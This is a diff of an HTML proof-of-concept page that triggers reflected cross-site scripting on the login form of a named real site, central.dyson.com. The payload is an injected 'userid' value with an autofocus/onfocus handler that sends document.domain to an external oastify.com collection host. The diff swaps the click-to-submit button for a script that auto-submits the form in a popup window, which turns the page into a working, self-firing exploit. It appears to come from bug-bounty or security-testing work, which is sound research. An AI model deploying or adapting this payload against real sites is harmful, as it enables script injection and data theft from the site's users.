@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h3>Click the button to trigger XSS on central.dyson.com</h3>
-
-    <form action="https://central.dyson.com/" method="POST" target="_blank">
-      <input type="hidden" name="userid" value='" autofocus onfocus="new Image().src=`http://6z6vxzx4idg02p3cpxr8q9btjkpcda1z.oastify.com?d=`+document.domain">
+    <form id="xssform" action="https://central.dyson.com/" method="POST" target="attackwindow">
+      <input type="hidden" name="userid" value='" autofocus onfocus="new Image().src=`https://4uz74cqe2h6zb9f48k4m40fa91fs3kr9.oastify.com?d=`+document.domain">
       <input type="hidden" name="password" value="x">
       <input type="hidden" name="mode" value="Login">
-      <button type="submit">Click me to login</button>
     </form>
+
+    <script>
+      const win = window.open('', 'attackwindow');
+      if (win) {
+        document.getElementById('xssform').submit();
+      } else {
+        document.write('Popup blocked. Please allow popups and refresh the page.');
+      }
+    </script>
   </body>
 </html>
